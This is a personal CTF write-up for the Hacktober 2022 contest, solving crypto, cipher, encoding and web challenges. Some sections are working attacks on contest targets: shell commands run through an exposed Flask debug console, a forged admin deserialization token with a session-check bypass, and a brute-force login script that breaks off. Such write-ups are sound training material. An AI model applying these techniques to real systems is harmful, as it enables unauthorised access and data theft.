---
layout: default
title: Hacktober 2022
nav_order: 9
description: "Hacktober CTF 2022"
permalink: /ctfs/hacktober22
has_children: false
parent: CTF List
last_modified_date: 30-10-2022 05:38 PM +0530
---

# Hacktober 2022
{: .no_toc}  

Hacktober is part of the security month October celebrations at my organization. A great experience to be part of and hack on.  
{: .fs-5 .fw-300 }  

## Challenge list
{: .no_toc .text-delta}

1. TOC
{:toc}


## Sm4ll 🤏
Crypto  
{: .label .label-green .fs-1 .ml-0}

This was the first challenge under the Crypto category. From the name and the challenge instructions it was clear it was something meant to be just a starter for Crypto.

Challenge instructions:  
> e : 3
> 
> n : 14765134568806152380780177404154379680157040230731901116353016162964681854643419545272768229048378188500692186311711971409968124480927254907468083269653523327630158185734310958362033077646043542383054670674171052587899204361134700584572459629071848166981160988717625552212126387741734276602999549288330861599376036039530488202175376193130850009446769741050982169300916990092646546337482900162177684652409252900439784938827069053004233947304644066471498232649486591080194031440952809932046199120487596759504590419575284525037462347888619653142049456789290070496111786961265998678923040521931493766189863302763399965481
> 
> c : 159824947944933145124838839627897472995222726725778699635746503980986937892371422645291581403491484060915790946238870994753794392630740865865372702551885464356303363652373929602662877152309665601671912554391480434375650725791107527216573236081089654751390509689517054062236946737731831215596006696199941703676597321808361467919236770950757

From the instructions it is clear that the exponent **`e`** used in the RSA encryption is very small compared to the value of **`n`**. Why is this important ?

The formula for encryption is as given below:
> c = m<sup>e</sup> mod(n)  

In this above formula it is clear that if **`n`** is sufficiently large then the modulus has no effect on the encryption and the cipher text reduces to an exponentiation of the message i.e the below formula:
> c = m<sup>e</sup>  

Due to this the message **`m`** can be easily retrieved by inverting the exponentiation.

We use the below code to invert the exponentiation and convert the resultant **`long`** value to **`bytes`**.

```sh
python3 -c "from Crypto.Util.number import long_to_bytes;from sympy import cbrt;m=cbrt(159824947944933145124838839627897472995222726725778699635746503980986937892371422645291581403491484060915790946238870994753794392630740865865372702551885464356303363652373929602662877152309665601671912554391480434375650725791107527216573236081089654751390509689517054062236946737731831215596006696199941703676597321808361467919236770950757);print(long_to_bytes(m))"
```

We obtain the flag **`ZCTF2022{e_is_too_sm4ll_better_e_next_time_pls}`** by running the above code.  


## Language of Gods 🗣
Misc
{: .label .label-green .fs-1 .ml-0}

This was one of the miscellaneous challenges. It required some logic to solve and follow the instructions.  

<details markdown="block">
  <summary>
  Click here to view the Challenge Instructions
  </summary>

> are you good with languages?
> 
> Astra Planeta :
> 
> The Astra Planeta were a group of five gods from Greek mythology, who were sometimes also referred to as the Astra.
> 
> Pyroeis, meaning Fiery One (Mars) is one of the Astra planeta tells the story of ancient greek glory in her/his language.
> 
> **`rchd qd zykdqncfcn wgc fhxcf, bfywczwyf, skn lswgcf yl sxx vynd skn gheskd.`**
> 
> which means
> 
> **`zeus is considered the ruler, protector, and father of all gods and humans.`**
> 
> **`tskwgyd ykc yl wgc qeeyfwsx gyfdcd yokcn jp wgc gcfy bcxchd skn gqd dyk szgqxxcd.`**
> 
> which means
> 
> **`xanthos one of the immortal horses owned by the hero peleus and his son achilles.`**
> 
> **`asdyk vfccm gcfy,mcfcd eykdwfyhd lcesxc dbqfqwd yl uqyxckw ncswg sfc ihsxqwp zgsfszwcfd.`**
> 
> which means
> 
> **`jason – greek hero,keres monstrous female spirits of violent death are quality characters.`**
> 
> He/she is saying somethin **`qk wgc ckn wgc gcfy q xqmc wgc eydw,esp pyh zsk zsxx gqe wgc uqxxqsk yf ogswcucf.....pyhf lxsv qd {mfswyd_wgc_sxeqvgwp_vyn_yl_osf}`**
> 
> Can you help me translate this?
>
> **Hint:** Add ZCTF2022{}

</details>

From the instructions it is clear that the text is encoded in different English characters. We have to decode it using the given samples.  

We write a simple python script to create a character to character map using the given samples and also verify if any of the characters have contradicting character maps. 

<details markdown="block">
  <summary>
  Click here to view the script
  </summary>


```python
from curses.ascii import isalpha


# map of gibberish to english
vals = {
    "rchd qd zykdqncfcn wgc fhxcf, bfywczwyf, skn lswgcf yl sxx vynd skn gheskd.": "zeus is considered the ruler, protector, and father of all gods and humans.",
    "tskwgyd ykc yl wgc qeeyfwsx gyfdcd yokcn jp wgc gcfy bcxchd skn gqd dyk szgqxxcd.": "xanthos one of the immortal horses owned by the hero peleus and his son achilles.",
    "asdyk vfccm gcfy,mcfcd eykdwfyhd lcesxc dbqfqwd yl uqyxckw ncswg sfc ihsxqwp zgsfszwcfd.": "jason greek hero,keres monstrous female spirits of violent death are quality characters.",
}

chr_map = {}

# creating character by character map
for x, y in vals.items():
    assert len(x) == len(y)
    for c, d in zip(x, y):
        if c in chr_map.keys() and d != chr_map[c]:
            # ensuring no character has conflicting mapping character
            print(
                "Error: key - {0}, new val - {1}, old val - {2}".format(
                    c, d, chr_map[c]
                )
            )
        else:
            chr_map[c] = d

print(chr_map)

# decode using the generated character map
val = "qk wgc ckn wgc gcfy q xqmc wgc eydw,esp pyh zsk zsxx gqe wgc uqxxqsk yf ogswcucf.....pyhf lxsv qd {mfswyd_wgc_sxeqvgwp_vyn_yl_osf}"
result = ""
for c in val:
    if c.isalpha():
        result = result + chr_map[c]
    else:
        result = result + c
print(result)

```
</details>


By running the above script we get the below output:  
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/languageofgods]
└─$ python3 decipher.py
{'r': 'z', 'c': 'e', 'h': 'u', 'd': 's', ' ': ' ', 'q': 'i', 'z': 'c', 'y': 'o', 'k': 'n', 'n': 'd', 'f': 'r', 'w': 't', 'g': 'h', 'x': 'l', ',': ',', 'b': 'p', 's': 'a', 'l': 'f', 'v': 'g', 'e': 'm', '.': '.', 't': 'x', 'o': 'w', 'j': 'b', 'p': 'y', 'a': 'j', 'm': 'k', 'u': 'v', 'i': 'q'}
in the end the hero i like the most,may you can call him the villian or whatever.....your flag is {kratos_the_almighty_god_of_war}
```

We use the hint to prefix `ZCTF2022` and get the flag as **`ZCTF2022{kratos_the_almighty_god_of_war}`**.


## Invisibility 🙈
Misc
{: .label .label-green .fs-1 .ml-0}

This was the first challenge in the miscellaneous category and supposed to be pretty easy. Let us go through the challenge instructions and then the step by step process involved to solve it.

Challenge instructions:
> An Exploding Fish from The Village Hidden in the Rain entered Konoha for destruction. Lord Fourth managed to hold it in a computer file and seal it with the Eight Trigrams Sealing Style.
>
> Team 7, your task is to find the fish that went in disguise as letters followed by numbers inside the computer file. You will find  your key to unlock the seal on your investigation path. Good luck Team 7.
>
> The challenge instructions also contained a link to a file which can be downloaded [here][1].

Given the above details we first download the file which is named as **`invisibility.png`**.  

As a standard rule you should never go by the file name's extension and always check via the file magic number. There are few tools like **`file`** command and **`binwalk`** which help us determine the actual file type.  

We run the below command and get the output as seen:
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/invisibility]
└─$ file ./invisiblity.png 
invisiblity.png: Zip archive data, at least v2.0 to extract
```  

It clearly shows that the file is not actually a PNG but a zip file. So we go ahead and rename the file as **`invisibility.zip`**.  
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/invisibility]
└─$ mv invisibility.png invisibility.zip
```  


The natural step next is to list the files present in the zip. We use the unzip command and see the output.  
<details markdown="block">
  <summary>
  Click here to view the output
  </summary>

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/invisibility]
└─$ unzip -l invisiblity.zip 
Archive:  invisiblity.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2022-10-18 15:54   invisiblity/
        0  2022-10-18 15:53   invisiblity/.secret/
        0  2022-10-18 15:52   invisiblity/.secret/a/
        0  2022-10-18 15:52   invisiblity/.secret/a/s
        0  2022-10-18 15:52   invisiblity/.secret/b/
        0  2022-10-18 15:52   invisiblity/.secret/b/y
        0  2022-10-18 15:52   invisiblity/.secret/c/
        0  2022-10-18 15:52   invisiblity/.secret/c/d
        0  2022-10-18 15:52   invisiblity/.secret/d/
        0  2022-10-18 15:52   invisiblity/.secret/d/2
        0  2022-10-18 15:52   invisiblity/.secret/e/
        0  2022-10-18 15:52   invisiblity/.secret/e/B
        0  2022-10-18 15:52   invisiblity/.secret/f/
        0  2022-10-18 15:52   invisiblity/.secret/f/n
        0  2022-10-18 15:52   invisiblity/.secret/g/
        0  2022-10-18 15:52   invisiblity/.secret/g/p
        0  2022-10-18 15:52   invisiblity/.secret/h/
        0  2022-10-18 15:52   invisiblity/.secret/h/F
        0  2022-10-18 15:52   invisiblity/.secret/i/
        0  2022-10-18 15:52   invisiblity/.secret/i/P
        0  2022-10-18 15:52   invisiblity/.secret/j/
        0  2022-10-18 15:52   invisiblity/.secret/j/Z
        0  2022-10-18 15:52   invisiblity/.secret/k/
        0  2022-10-18 15:52   invisiblity/.secret/k/5
        0  2022-10-18 15:52   invisiblity/.secret/l/
        0  2022-10-18 15:52   invisiblity/.secret/l/D
        0  2022-10-18 15:52   invisiblity/.secret/m/
        0  2022-10-18 15:52   invisiblity/.secret/m/G
        0  2022-10-18 15:52   invisiblity/.secret/n/
        0  2022-10-18 15:52   invisiblity/.secret/n/a
        0  2022-10-18 15:52   invisiblity/.secret/o/
        0  2022-10-18 15:52   invisiblity/.secret/o/Z
        0  2022-10-18 15:52   invisiblity/.secret/p/
        0  2022-10-18 15:52   invisiblity/.secret/p/o
        0  2022-10-18 15:52   invisiblity/.secret/q/
        0  2022-10-18 15:52   invisiblity/.secret/q/W
        0  2022-10-18 15:52   invisiblity/.secret/r/
        0  2022-10-18 15:52   invisiblity/.secret/r/M
        0  2022-10-18 15:52   invisiblity/.secret/s/
        0  2022-10-18 15:52   invisiblity/.secret/s/T
        0  2022-10-18 15:52   invisiblity/.secret/t/
        0  2022-10-18 15:52   invisiblity/.secret/t/d
        0  2022-10-18 15:52   invisiblity/.secret/u/
        0  2022-10-18 15:52   invisiblity/.secret/u/s
        0  2022-10-18 15:52   invisiblity/.secret/v/
        0  2022-10-18 15:52   invisiblity/.secret/v/Q
        0  2022-10-18 15:52   invisiblity/.secret/w/
        0  2022-10-18 15:52   invisiblity/.secret/w/R
        0  2022-10-18 15:52   invisiblity/.secret/x/
        0  2022-10-18 15:52   invisiblity/.secret/x/e
        0  2022-10-18 15:52   invisiblity/.secret/y/
        0  2022-10-18 15:52   invisiblity/.secret/y/v
        0  2022-10-18 15:52   invisiblity/.secret/z/
        0  2022-10-18 15:52   invisiblity/.secret/z/U
        0  2022-10-18 15:52   invisiblity/.secret/1/
        0  2022-10-18 15:52   invisiblity/.secret/1/8
        0  2022-10-18 15:52   invisiblity/.secret/2/
        0  2022-10-18 15:52   invisiblity/.secret/2/B
        0  2022-10-18 15:52   invisiblity/.secret/3/
        0  2022-10-18 15:52   invisiblity/.secret/3/N
        0  2022-10-18 15:52   invisiblity/.secret/4/
        0  2022-10-18 15:52   invisiblity/.secret/4/x
        0  2022-10-18 15:52   invisiblity/.secret/5/
        0  2022-10-18 15:52   invisiblity/.secret/5/4
        0  2022-10-18 15:52   invisiblity/.secret/6/
        0  2022-10-18 15:52   invisiblity/.secret/6/i
        0  2022-10-18 15:52   invisiblity/.secret/7/
        0  2022-10-18 15:52   invisiblity/.secret/7/o
        0  2022-10-18 15:52   invisiblity/.secret/8/
        0  2022-10-18 15:52   invisiblity/.secret/8/S
        0  2022-10-18 15:52   invisiblity/.secret/9/
        0  2022-10-18 15:52   invisiblity/.secret/9/e
        0  2022-10-18 15:52   invisiblity/.secret/10/
        0  2022-10-18 15:52   invisiblity/.secret/10/U
        0  2022-10-18 15:52   invisiblity/.secret/11/
        0  2022-10-18 15:52   invisiblity/.secret/11/L
        0  2022-10-18 15:52   invisiblity/.secret/12/
        0  2022-10-18 15:52   invisiblity/.secret/12/H
        0  2022-10-18 15:52   invisiblity/.secret/13/
        0  2022-10-18 15:52   invisiblity/.secret/13/w
        0  2022-10-18 15:52   invisiblity/.secret/14/
        0  2022-10-18 15:52   invisiblity/.secret/14/s
        0  2022-10-18 15:52   invisiblity/.secret/15/
        0  2022-10-18 15:52   invisiblity/.secret/15/r
        0  2022-10-18 15:52   invisiblity/.secret/16/
        0  2022-10-18 15:52   invisiblity/.secret/16/r
        0  2022-10-18 15:52   invisiblity/.secret/17/
        0  2022-10-18 15:52   invisiblity/.secret/17/2
        0  2022-10-18 15:52   invisiblity/.secret/18/
        0  2022-10-18 15:52   invisiblity/.secret/18/y
        0  2022-10-18 15:52   invisiblity/.secret/19/
        0  2022-10-18 15:52   invisiblity/.secret/19/m
        0  2022-10-18 15:52   invisiblity/.secret/20/
        0  2022-10-18 15:52   invisiblity/.secret/20/3
        0  2022-10-18 15:52   invisiblity/.secret/21/
        0  2022-10-18 15:52   invisiblity/.secret/21/A
        0  2022-10-18 15:52   invisiblity/.secret/22/
        0  2022-10-18 15:52   invisiblity/.secret/22/M
        0  2022-10-18 15:52   invisiblity/.secret/23/
        0  2022-10-18 15:52   invisiblity/.secret/23/m
        0  2022-10-18 15:52   invisiblity/.secret/24/
        0  2022-10-18 15:52   invisiblity/.secret/24/d
        0  2022-10-18 15:52   invisiblity/.secret/25/
        0  2022-10-18 15:52   invisiblity/.secret/25/c
        0  2022-10-18 15:52   invisiblity/.secret/26/
        0  2022-10-18 15:52   invisiblity/.secret/26/5
        0  2022-10-18 15:52   invisiblity/.secret/27/
        0  2022-10-18 15:52   invisiblity/.secret/27/q
        0  2022-10-18 15:52   invisiblity/.secret/28/
        0  2022-10-18 15:52   invisiblity/.secret/28/Q
        0  2022-10-18 15:52   invisiblity/.secret/29/
        0  2022-10-18 15:52   invisiblity/.secret/29/R
        0  2022-10-18 15:52   invisiblity/.secret/30/
        0  2022-10-18 15:52   invisiblity/.secret/30/d
        0  2022-10-18 15:52   invisiblity/.secret/31/
        0  2022-10-18 15:52   invisiblity/.secret/31/S
        0  2022-10-18 15:52   invisiblity/.secret/32/
        0  2022-10-18 15:52   invisiblity/.secret/32/+
        0  2022-10-18 15:52   invisiblity/.secret/33/
        0  2022-10-18 15:52   invisiblity/.secret/33/8
        0  2022-10-18 15:52   invisiblity/.secret/34/
        0  2022-10-18 15:52   invisiblity/.secret/34/i
        0  2022-10-18 15:52   invisiblity/.secret/35/
        0  2022-10-18 15:52   invisiblity/.secret/35/2
        0  2022-10-18 15:52   invisiblity/.secret/36/
        0  2022-10-18 15:52   invisiblity/.secret/36/q
        0  2022-10-18 15:52   invisiblity/.secret/37/
        0  2022-10-18 15:52   invisiblity/.secret/37/D
        0  2022-10-18 15:52   invisiblity/.secret/38/
        0  2022-10-18 15:52   invisiblity/.secret/38/o
        0  2022-10-18 15:52   invisiblity/.secret/39/
        0  2022-10-18 15:52   invisiblity/.secret/39/r
        0  2022-10-18 15:52   invisiblity/.secret/40/
        0  2022-10-18 15:52   invisiblity/.secret/40/H
        0  2022-10-18 15:52   invisiblity/.secret/41/
        0  2022-10-18 15:52   invisiblity/.secret/41/M
        0  2022-10-18 15:52   invisiblity/.secret/42/
        0  2022-10-18 15:52   invisiblity/.secret/42/q
        0  2022-10-18 15:52   invisiblity/.secret/43/
        0  2022-10-18 15:52   invisiblity/.secret/43/p
        0  2022-10-18 15:52   invisiblity/.secret/44/
        0  2022-10-18 15:52   invisiblity/.secret/44/G
        0  2022-10-18 15:52   invisiblity/.secret/45/
        0  2022-10-18 15:52   invisiblity/.secret/45/S
        0  2022-10-18 15:52   invisiblity/.secret/46/
        0  2022-10-18 15:52   invisiblity/.secret/46/K
        0  2022-10-18 15:52   invisiblity/.secret/47/
        0  2022-10-18 15:52   invisiblity/.secret/47/0
        0  2022-10-18 15:52   invisiblity/.secret/48/
        0  2022-10-18 15:52   invisiblity/.secret/48/m
        0  2022-10-18 15:52   invisiblity/.secret/49/
        0  2022-10-18 15:52   invisiblity/.secret/49/f
        0  2022-10-18 15:52   invisiblity/.secret/50/
        0  2022-10-18 15:52   invisiblity/.secret/50/w
        0  2022-10-18 15:52   invisiblity/.secret/51/
        0  2022-10-18 15:52   invisiblity/.secret/51/y
        0  2022-10-18 15:52   invisiblity/.secret/52/
        0  2022-10-18 15:52   invisiblity/.secret/52/M
        0  2022-10-18 15:52   invisiblity/.secret/53/
        0  2022-10-18 15:52   invisiblity/.secret/53/L
        0  2022-10-18 15:52   invisiblity/.secret/54/
        0  2022-10-18 15:52   invisiblity/.secret/54/n
        0  2022-10-18 15:52   invisiblity/.secret/55/
        0  2022-10-18 15:52   invisiblity/.secret/55/B
        0  2022-10-18 15:52   invisiblity/.secret/56/
        0  2022-10-18 15:52   invisiblity/.secret/56/5
        0  2022-10-18 15:52   invisiblity/.secret/57/
        0  2022-10-18 15:52   invisiblity/.secret/57/l
        0  2022-10-18 15:52   invisiblity/.secret/58/
        0  2022-10-18 15:52   invisiblity/.secret/58/3
        0  2022-10-18 15:52   invisiblity/.secret/59/
        0  2022-10-18 15:52   invisiblity/.secret/59/w
        0  2022-10-18 15:52   invisiblity/.secret/60/
        0  2022-10-18 15:52   invisiblity/.secret/60/Q
        0  2022-10-18 15:52   invisiblity/.secret/61/
        0  2022-10-18 15:52   invisiblity/.secret/61/=
        0  2022-10-18 15:52   invisiblity/.secret/62/
        0  2022-10-18 15:52   invisiblity/.secret/62/=
       13  2022-10-18 15:54   invisiblity/flag.txt
---------                     -------
       13                     179 files
```
</details>  

On inspecting the output of the **`unzip`** command we find that it contains around **`64`** folders and **`1`** file per folder.  
The name of the files seem to form a Base64 encoded text. So we copy the output of the above command to a text editor and create a string using the file names alone.  

The final string obtained by concatenating the file names can be seen below:  
**`syd2BnpFPZ5DGaZoWMTdsQRevU8BNx4ioSeULHwsrr2ym3AMmdc5qQRdS+8i2qDorHMqpGSK0mfwyMLnB5l3wQ=`**  

We try to decode this content but we do not get a flag per se. So we understand that this could be an encrypted content represented as a Base64 encoded string.  

We also notice another file within the zip named as **`flag.txt`** the contents of which are **`key: zctf2022`**. This also points towards the fact that the content is encrypted and the possible key is **`zctf2022`**.  

Now one last part that we need to figure out is the type of encryption that could have been used.  
We use [this][2] online tool to speed up the iteration of the decryption and transformation process. It has support for various decryption schemes that can be tried out easily.  


However in hindisight going through the **challenge instructions** again gives us a clue on the encryption scheme. The clue talks about **`fish`** and there is an encryption scheme called **`Blowfish`**.  
So we run the **`Blowfish`** decryption algorithm using the above website with the below parameters:  

> **`From Base64`** transformation  
> **`Blowfish`** decryption  
> **`Key`** as stated above  
> **`IV`** same as key  
> **`UTF-8`** for **`Key`** and **`IV`** format  
> **`Raw`** for input format  
> **`ECB`** mode for block cipher  
>  

On running the above transformation we get the below string which is again Base64 encoded:  
**`WkNURjIwMjJ7RzBPRF9KMCRfWTB1X0YwVW45X3Q1M19mTEBnX2gzNjN9`**  

We Base64 decode it once more to get the flag as below:  
**`ZCTF2022{G0OD_J0$_Y0u_F0Un9_t53_fL@g_h363}`**. You can check the whole transformation [here][3].  


## Rampage 🐞
Web
{: .label .label-green .fs-1 .ml-0}

It was the web challenge released in the second wave of challenges and was a bit easier than the previous two. It was more of a **`Flask`** package behavioural issue that had to be exploited.  

Challenge instructions:
> The developer of the application made a huge mistake which made the whole organization go rampage.  
> Can you find his mistake? anyway the application died and all it showing a source page.  
> **Link:** https://h22-ctf-0ecwn9kp0g.dummydomain.team/  


The link had the below source code:
```python
from flask import Flask, render_template
app = Flask(__name__)
@app.route('/')
def home():
   return render_template('base.html')
if __name__ == '__main__':
   app.run("0.0.0.0",debug=True)
```

From the source and the challenge instructions it was very clear that we had to exploit some coding language or package specific vulnerability. Looking at source code the only thing that is wrong is the part where **`debug=True`** is set.  

On quickly searching for **`debug`** behaviour of **`Flask`** it was clear that the **`Python`** console is exposed at **`/console`** url of the same host and port on which the application was running.  

Thus invoking the below URL gave us an interactive **`Python`** console.  
> https://h22-ctf-0ecwn9kp0g.dummydomain.team/console  
> **Note:** Link might not be active  

Once we have the server's **`Python`** console, all we had to do was to establish a piped subprocess to retrieve the flag from most probably a file. We can also execute the required **`ls`** command to get the file name as seen below.  

```sh
>>> import subprocess;out = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
b'app.py\nflag.txt\nrequirements.txt\ntemplates\n'

>>> import subprocess;out = subprocess.Popen(['cat', 'flag.txt'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
b'ZCTF2022{N3v3r_3v3r_Switch_0n_deBug_m0d3_It_HuRts}\n'
```  
> **Note:**  However while trying this, there were some repeated attempts required as there was some obscure **URL requested not found** error.  

From the above, we obtain the final flag as **`ZCTF2022{N3v3r_3v3r_Switch_0n_deBug_m0d3_It_HuRts}`**.  


## Map map 🧩
Misc
{: .label .label-green .fs-1 .ml-0}


It was another interesting challenge under the miscellaneous category which was geared towards beginners. It needed only basic logic and understanding to get it right.  

<details markdown="block">
  <summary>
  Challenge instructions:
  </summary>

> Map me in the correct order ! you will get the reward " " , "▄" , "▀","█"  
>
> 222222222222222222222222222222222  
> 222222222222222222222222222222222  
> 222213333312233143441213333312222  
> 222212111212431122441212111212222  
> 222212333212341233324212333212222  
> 222233333332343214123233333332222  
> 222233422133431231244422134442222  
> 222232411434234132422312432332222  
> 222243111332411241143332143122222  
> 222212431233243242443121233432222  
> 222232222333123231421333132232222  
> 222213333312142434221232114212222  
> 222212111212231312421331331312222  
> 222212333212424212121142233232222  
> 222233333332333333332323233332222  
> 222222222222222222222222222222222  
> 222222222222222222222222222222222  
>   

</details>  

From the challenge instructions we make couple of observations. We are given 4 different ASCII character codes and the matrix given also has 4 unique numbers. The challenge title being **`Map map`** it screams out that we need to map the numbers to the ASCII characters.  

We had different possible combinations and we write a simple **`python`** script to do the same which is listed below.  

<details markdown="block">
  <summary>
  map.py:  
  </summary>


```python
values = {2: " ", 4: "▄", 3: "▀", 1: "█"}
block_len = len("222222222222222222222222222222222")
nums = "222222222222222222222222222222222222222222222222222222222222222222222213333312233143441213333312222222212111212431122441212111212222222212333212341233324212333212222222233333332343214123233333332222222233422133431231244422134442222222232411434234132422312432332222222243111332411241143332143122222222212431233243242443121233432222222232222333123231421333132232222222213333312142434221232114212222222212111212231312421331331312222222212333212424212121142233232222222233333332333333332323233332222222222222222222222222222222222222222222222222222222222222222222222"

patt = ""
count = 0
for ch in nums:
    ich = int(ch)
    patt = patt + values[ich]
    count += 1
    if count >= block_len:
        count = 0
        print(patt)
        patt = ""
```  
</details>  

The above script gives the below output which gives us a QR code. I have used the correct combination in the map **`values`** available in the above code. However I did arrive at it after trying out different combinations.  

<details markdown="block">
  <summary>
  Click here to view generated QR image
  </summary>  

![QR Code][4]  

</details>  

Scanning the QR code gives us **`ZCTF2022{0h_mY_QR_h3r0}`** as the required flag.  


## Modular arithmetic 🧮
Crypto
{: .label .label-green .fs-1 .ml-0}

As part of the Crypto challenges, this was one of the simpler challenges. It was mainly based on the vulnerability that modulo arithmetic poses if the multiplicative factor of the key is not sufficiently larger than the modulus.  

Challenge instructions:  
> Welcome to the modular arithmetic problem! all you have to do is retrieve the flag ! ez cap right?
>
> FLAG * 119948116572587480997985582334842499834139017074740244172893978641231971653679284885535770764885244146275107129639174950656129550741242015487644374633039028514213604207859710602579233565386512264983884893313264852933857570177107480942356063931856766071742206951696545246969307478515463331847910116687811549789 % 27798671172746123316367501554477714103201077664553055338381724229489308743252202673118338431986735820935502500168807967396109872212519718089843955114568715431983462347218151678596224481078105682883598874441804051055671916685902451927596655109511274227936790635451155327589740397737027253878906663847852789425886906175306456096029392317222257565763986277028821850346539761626776804138546602611623627585179746501285952243310794924241242006941368358489947933506553709491278176484915039735992701770209543217307930974195820136254927926713710676823548977484140850943548032532442073006093861313068867360841315453657119523669
>
> Result : 320938689236299679882228352461175650128560680204086548880945883660230710225726172454365953302228156195553468796283457018982013991926073747557019778673497352651787839537737262282694815984977750655402260723735979848907965825257552421064475750167621301717001579464850917047033379556568052340366800783687164883470058975127916314456063209401613050634931788089301208390828770979601290161172981353
> 

From the instructions it is clear that there is no real RSA involved here. It is purely based on modulo operation. Another thing that we can immediately note is that the multiplying number has less than half the digits as compared to the number used for modulo.  

This means we are performing a modulo using a very large number and as the multiplying number is very small, and message generally we are looking for is a small flag, the modulo would have been of no use i.e the quotient would have been the value **`0`**.  

So we try dividing the result by the multiplied number and convert the long to bytes to check for the flag format. We use the below script to do the same.  

<details markdown="block">
  <summary>
  find_modulo.py
  </summary>
  
```python
# FLAG * K % mod_e = cip
k = 119948116572587480997985582334842499834139017074740244172893978641231971653679284885535770764885244146275107129639174950656129550741242015487644374633039028514213604207859710602579233565386512264983884893313264852933857570177107480942356063931856766071742206951696545246969307478515463331847910116687811549789

mod_e = 27798671172746123316367501554477714103201077664553055338381724229489308743252202673118338431986735820935502500168807967396109872212519718089843955114568715431983462347218151678596224481078105682883598874441804051055671916685902451927596655109511274227936790635451155327589740397737027253878906663847852789425886906175306456096029392317222257565763986277028821850346539761626776804138546602611623627585179746501285952243310794924241242006941368358489947933506553709491278176484915039735992701770209543217307930974195820136254927926713710676823548977484140850943548032532442073006093861313068867360841315453657119523669

cip = 320938689236299679882228352461175650128560680204086548880945883660230710225726172454365953302228156195553468796283457018982013991926073747557019778673497352651787839537737262282694815984977750655402260723735979848907965825257552421064475750167621301717001579464850917047033379556568052340366800783687164883470058975127916314456063209401613050634931788089301208390828770979601290161172981353

from Crypto.Util.number import long_to_bytes

print(long_to_bytes(cip // k))
```

</details>  

The output of running the above script gives us the required flag **`ZCTF2022{modular_arithmetic_r0cks}`**.  


## Serial killer ☠️
Web
{: .label .label-green .fs-1 .ml-0}

The category and the name of this challenge clearly pointed out that it was some kind of object deserialization vulnerability. We were supposed to inject a newly crafted/serialized object to get the flag.  

Challenge instructions:
> **Challenge URL:** https://h22-ctf-i16omaetxx.dummydomain.team/App/
>  
> **Source:** link **Password:** zCtf_2022

> **Note:** The challenge URL might not be active now. The source code download is available [here][5].  

On analyzing the URL we are presented with a login page. Also we unzip the source link using the given password to obtain two files, one is the application's war file and another is a library used to generate a serialized object.  

We decompile the application's jar files using our favourite IDE or any Java decompilation tool [online][7] and go through the source code to note the below key points:  

> **Info:** You can download the decompiled source for this challenge readily [here][6].  

1. On checking the file **Home.java** we see that the flag is available in the **`/flag`** url.
2. However the **`/flag`** url can only be accessed with a token that passes the **`Helper.isAdmin(token)`** check.
3. The token is obtained from the cookie named **`token`** and from **Login.java** it is clear that the **`token`** cookie is set to the Base64 encoded serialized **`AuthToken`** object.
4. The **`Helper.isAdmin(token)`** check verifies if the **`AuthToken`** object has the **role** set to **`Role.ADMIN`**.
5. Another important point is the fact that there is proper whitelisting of specific classes which alone pass through the **`SecureObjectInputStream.java`** and get deserialized. So its **NOT** a random deserialization vulnerability where we can get a reverse shell.

From the above we understand that we need to craft a serialized AuthToken object that has username set to **`admin`** and role set to **`admin`**.  

To do the same, we go ahead and write a small Java code that depends on the source code of the application. So we create a Java class within the **`WEB-INF/classes`** folder present inside the **`App.war`** file with the below code.  

SerializedAuthToken.java  

```java
public class SerializedAuthToken {
    public static void main(String args[]) throws Exception {
        AuthToken authToken = new AuthToken("user");
        authToken.setUsername("admin");
        authToken.setRole(Role.ADMIN);
        System.out.println(Helper.serialize(authToken));
        
    }
}
```

Compile and run this code to get the serialized Base64 encoded string.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/serial_killer]
└─$ javac SerializedAuthToken.java 

┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/serial_killer]
└─$ java SerializedAuthToken 
rO0ABXNyAAlBdXRoVG9rZW6F6PRQzP741QIAAkwABHJvbGV0AAZMUm9sZTtMAAh1c2VybmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwfnIABFJvbGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AAVBRE1JTnQABWFkbWlu
```

Now we have the payload. We can immediately change the session token during login, by changing the value for the session key **`token`**.  

However this does not solve the challenge and the page does not get opened. So next I went on to analyze the exact authentication code available in **`Flag.java`** and highlight the specific checks that we need to bypass:

```java
line 26: if (Helper.isAdmin(token) && sessionId != null) {
line 39: if (sc.contains(sessionId.getValue())) {
```

The first check is bypassed by changing the **`token`** value to the new crafted seriaized payload and setting the **`JSESSIONID`** value to some non null value. To bypass the second check we need to set the **`JSESSIONID`** with some valid session ID that is already available in the **`/zctf/jsessions`** file. However the check has a security issue. It uses the **`contains`** check which means we can modify the **`sessionId`** value to any random character which is generally present in a session id that is generated by Tomcat session.  

So our final bypass is to modify the **`JSESSIONID`** to some random character(s) that are generally present in the session ids.  

Doing this gives us the flag page with the required flag.  


## Basic Web Login 1 🕸
Web
{: .label .label-green .fs-1 .ml-0}

This was the first Web challenge and was very clear that brute forcing was the only way out. However I was reluctant to brute force due to which it dragged to the last moment for me to solve this challenge.  

Challenge instructions:
> An Ops team member usually saves his account details in google chrome and it got leaked in the dark web through browser sync and vulnerable extensions from his personal machine.
> 
> The username and password is suspected to be present here - Link
>
> https://h22-ctf-kr2i71j106.dummydomain.team/
> 
> **Note:** The link just contained a list of strings that are suspected to be the username and/or password.
> 

As stated before this was a password spray attack and we had to run a random username and password attack. I did try using the **`Intruder`** tool in [Burpsuite][8]. However there are lot of restrictions in the tool and almost did not solve for me.  

So finally I ended up creating a **`python`** script for the same which can be seen below.  
> **Note:** Before running the python script please create a password list file named `passlist.txt` in the same folder.

<details markdown="block">
  <summary>
  Click here to view solve.py
  </summary>

```python
import requests
from tqdm import tqdm

with open("passlist.txt", "r") as fp:
    leaked_creds = fp.read().splitlines()

print(leaked_creds, len(leaked_creds))

URL = "https://h22-ctf-kr2i71j106.dummydomain.team/validate"

headers = {
    "Host": "h22-ctf-kr2i71j106.dummydomain.team",
